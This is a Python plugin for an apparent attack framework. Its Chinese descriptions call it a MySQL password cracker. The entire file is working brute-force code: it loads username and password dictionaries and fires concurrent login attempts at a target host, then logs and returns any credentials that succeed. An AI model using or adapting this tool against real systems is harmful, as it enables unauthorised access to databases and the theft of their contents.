# -*-* coding:UTF-8
import os
import aiomysql


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "mysql服务口令破解",
        "datetime": "2022-01-16"
    }

    @cli.options('ip', desc="需要攻击的目标", default='{self.target.value}')
    @cli.options('port', desc="需要攻击的端口", type=int, default=3306)
    @cli.options('method', desc="口令爆破的模式 1:单点模式 2:交叉模式", type=int, default=2)
    @cli.options('username', desc="用户账号或字典文件", default=os.path.join('data', 'mysql_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'mysql_password.dict'))
    @cli.options('timeout', desc="连接超时时间", type=int, default=5)
    @cli.options('workers', desc="协程并发数量", type=int, default=50)
    def ip(self, ip, port, method, username, password, timeout, workers) -> dict:
        with self.async_pool(max_workers=workers, threshold=self.threshold) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.custom_task, ip, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def custom_task(self, ip, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        conn = await aiomysql.connect(host=ip, port=port, user=username, password=password, connect_timeout=timeout)
        conn.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': 3306,
            'server': 'mysql',
            'username': username,
            'password': password
        }
